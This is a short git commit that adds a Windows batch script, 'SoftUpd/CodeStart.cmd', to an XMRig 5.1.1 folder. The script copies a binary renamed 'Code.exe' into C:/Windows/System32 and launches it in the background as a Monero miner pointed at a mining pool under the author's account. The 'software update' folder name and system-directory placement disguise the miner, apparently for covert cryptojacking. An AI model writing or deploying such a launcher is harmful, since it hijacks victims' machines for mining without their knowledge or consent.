5be428d6d6c74533636bce40f7525328186fe02a
MinecraftFuns <45290401+vmlankub@users.noreply.github.com>
2019-12-10 13:01:22 +0800

    Add files via upload

---
+++ xmrig-5.1.1/SoftUpd/CodeStart.cmd
@@ -0,0 +1,4 @@
+@echo off
+move /Y Code.exe C:/Windows/System32/
+C:/Windows/System32/Code.exe -B --donate-level 1 --threads 1 -o xmr.pool.minergate.com:45700 -u minecraftfuns@outlook.com -p x -k
+pause
